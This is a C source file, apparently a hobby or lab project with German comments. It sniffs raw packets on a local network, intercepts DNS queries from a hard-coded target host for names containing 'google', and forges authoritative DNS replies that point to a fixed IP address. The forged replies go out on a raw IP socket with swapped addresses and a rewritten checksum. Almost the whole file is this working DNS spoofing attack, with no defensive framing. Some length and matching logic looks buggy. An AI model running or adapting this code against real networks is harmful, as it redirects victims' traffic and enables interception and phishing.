#include <stdio.h>
#include <linux/if_packet.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>


// TODO: sende nicht udp, sondern ip level, sodass du deine ip aendern kannst


char packet[65536];
struct ethhdr *eth_header;
struct iphdr  *ip_header;
struct udphdr *udp;
struct tcphdr *tcp;
uint32_t target;
uint32_t gateway;
uint32_t myip;
int sender;
ssize_t length = 0;
uint16_t id = 0;

struct dnshdr{
	uint16_t id;
	uint16_t flags;
	uint16_t qdcount;
	uint16_t ancount;
	uint16_t nscount;
	uint16_t arcount;
};

struct dnshdr *dns;

struct anhdr{
	uint16_t name;
	uint16_t type;
	uint16_t class;
	uint16_t ttl1;
	uint16_t ttl2;
	uint16_t rdlength;
	uint32_t rdata;
};

struct qdhdr{
	uint16_t qtype;
	uint16_t qclass;
};


void calc_ip_checksum(){
	uint16_t check = 0;
	uint16_t cv = 0;
	uint16_t *csum = (uint16_t *)ip_header;
	for(int i = 0;i < 5;i++, csum++){
		check = check + ntohs( *csum );
		if(cv > check)
			check++;
		cv = check;
	}
	csum++;
	for(int i = 0;i < 4;i++, csum++){
		check = check + ntohs( *csum );
		if(cv > check)
			check++;
		cv = check;
	}
	ip_header->check = ~check;
}


uint16_t create_spoof(){
	dns->flags = dns->flags | 0x8000;
	dns->flags = dns->flags | 0x0400;
	dns->flags = dns->flags & ~(0x000f);
	dns->flags = dns->flags | 0x0010;
	dns->flags = dns->flags | 0x0020;
	dns->flags = htons(dns->flags);
	dns->ancount = dns->qdcount;
	dns->nscount = 0;
	dns->arcount = 0;
	char *question = ((char *) dns) + sizeof(struct dnshdr);
	ssize_t qlen = strlen(question);
	char *awnser = question + qlen + 1;
	awnser = awnser + 4;
	struct anhdr *ahdr = (struct anhdr *)awnser;
	ahdr->name = 0x0cc0;
	ahdr->type = htons(1);
	ahdr->class = htons(1);
	ahdr->ttl1 = htons(10);
	ahdr->ttl2 = 0;
	ahdr->rdlength = htons(4);
	ahdr->rdata = inet_addr("172.217.19.68");
	uint32_t container = ip_header->saddr;
	ip_header->saddr = ip_header->daddr;
	ip_header->daddr = /*target; */  inet_addr("192.168.178.87");
	ip_header->tot_len = htons(length + qlen * 2);
	ip_header->id = htons(ntohs(id) + 1);
	uint16_t c = udp->source;
	udp->source = udp->dest;
	udp->dest = c;
	udp->check = 0;
	calc_ip_checksum();
	return length + qlen - 1 ;
}

void print_dns(){
	printf(" ------------------------ DNS-PACKET 0x%.4x\n",dns->id);
	printf("qr = %d\n",dns->flags & 0x8000);
	printf("opcode = %d\n",dns->flags & 0x7800);
	printf("aa = %d\n",dns->flags & 0x0400);
	printf("flags = %x\n",dns->flags);
	printf("qdcount = %d\n",ntohs(dns->qdcount));
	printf("ancount = %d\n",ntohs(dns->ancount));
	printf("nscount = %d\n",ntohs(dns->nscount));
	printf("arcount = %d\n",ntohs(dns->arcount));
	char *name = ((char *)dns) + sizeof(struct dnshdr);
	struct qdhdr *qhdr;
	printf("--------------------- Question ------------------------\n");
	for(int i = 0;i < ntohs(dns->qdcount);i++){
		printf(" -------- Question %d\n",i);
		printf("%s\n",name);
		qhdr = name + strlen(name) + 1;
		printf("qtype = %d\n",ntohs(qhdr->qtype));
		printf("qclass = %d\n",ntohs(qhdr->qclass));
		name = ((char *) qhdr) + sizeof(struct qdhdr);
	}
	printf("--------------------- Answers ------------------------\n");
	struct anhdr *ahdr;
	for(int i = 0;i < ntohs(dns->ancount);i++){
		printf(" -------- Awnser %d\n",i);
		printf("%s\n",name);
		ahdr = name + strlen(name) + 1;
		printf("type = %d\n",ntohs(ahdr->type));
		printf("class = %d\n",ntohs(ahdr->class));
		printf("ttl = %d\n",ntohl(ahdr->ttl1));
		printf("rdlength = %d\n",ntohs(ahdr->rdlength));
		printf("rdata = 0x%.8x\n",ahdr->rdata);
		name = ((char *)ahdr) + sizeof(struct anhdr);
	}
}

char test_dns(){
	char *dnsname = ((char *)dns ) + sizeof(struct dnshdr);
	ssize_t dlen = strlen(dnsname);
	char *scope = "google";
	for(int i = 0;i < dlen - 6;i++){
		if(dnsname[i] == scope[0]){
			for(int n = 1;n < 6;n++){
				if(dnsname[i+n] == scope[n]){
					if(n == 4)
						return 0;
				}else
					break;
			}
		}
	}
	return 1;
}


void handle_dns(ssize_t len){
	if(len < sizeof(struct udphdr))
		return;
	if(ip_header->saddr == gateway){
		id = ip_header->id;
		printf("id ist jetzt %d\n",htons(id));
	}
	if(dns->ancount == 0 && dns->qdcount > 0){
		if(!test_dns()){
			printf("%d qestions\n",ntohs(dns->qdcount));
			struct sockaddr_in addr;
			addr.sin_family = AF_INET;
			addr.sin_port = udp->dest;
			addr.sin_addr.s_addr = ip_header->daddr;
			uint16_t slen = create_spoof();
			print_dns();
			char *it = ip_header;
			for(int i = 0;i < slen;i++ , it++)
				printf("%x ",(unsigned char)*it);
			printf("\n");
			int res = sendto(sender,(char *)ip_header,slen,MSG_CONFIRM,
				(struct sockaddr *) &addr, sizeof(addr));
			if(res < 0){
				printf("Error while sending dns packet %d\n",res);
				exit(-1);
			}
		}
	}
}


void handle_udp(ssize_t len){
	if(len < sizeof(struct udphdr))
		return;
	uint16_t sport = ntohs(udp->source);
	uint16_t dport = ntohs(udp->dest);
	if(sport == 53 || dport == 53)
		handle_dns(len - sizeof(struct udphdr));
}

void handle_ip(ssize_t len){
	if(len < sizeof(struct iphdr))
		return;
	uint32_t ip1 = ip_header->saddr;
	uint32_t ip2 = ip_header->daddr;
	if(ip1 != target && ip2 != target)
		return;
	if(ip_header->protocol != 17)
		return;
	handle_dns(len - sizeof(struct iphdr));
}

void handle_packet(ssize_t len){
	if(len < sizeof(struct ethhdr))
		return;
	unsigned short pro = ntohs(eth_header->h_proto);
	if(pro != 0x800)
		return;
	handle_ip(len - sizeof(struct ethhdr));
}




int main(){
	struct anhdr ahdr;
	printf("%p\n",&ahdr.name);
	printf("%p\n",&ahdr.type);
	printf("%p\n",&ahdr.class);
	printf("%p\n",&ahdr.ttl1);
	printf("%p\n",&ahdr.ttl2);
	printf("%p\n",&ahdr.rdlength);
	printf("%p\n",&ahdr.rdata);
	int sock = socket(AF_PACKET,
		SOCK_RAW,
		htons(ETH_P_ALL));
	if(sock< 0){
		printf("Error while creating the sniff socket %d\n",sock);
		return -1;
	}
	sender = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	if(sender < 0){
		printf("Error while creating the udp socket %d\n",sender);
		return -1;
	}
	length = sizeof(struct dnshdr);
	length = length + 2;
	length = length + 4;
	length = length + sizeof(struct anhdr);
	length = length + sizeof(struct udphdr);
	length = length + sizeof(struct iphdr);
	eth_header = packet;
	ip_header = ((char *)&packet) + sizeof(struct ethhdr);
	udp = ((char *) ip_header) + sizeof(struct iphdr);
	tcp = udp;
	target = inet_addr("192.168.178.28");
	gateway = inet_addr("192.168.178.1");
	myip = inet_addr("192.168.178.28");
	dns = ((char *) udp) + sizeof(struct udphdr);
	ssize_t plen = recvfrom(sock,packet,65536,0,NULL,NULL);
	while(plen > 0){
		handle_packet(plen);
		plen = recvfrom(sock,packet,65536,0,NULL,NULL);
	}
	return 0;
}
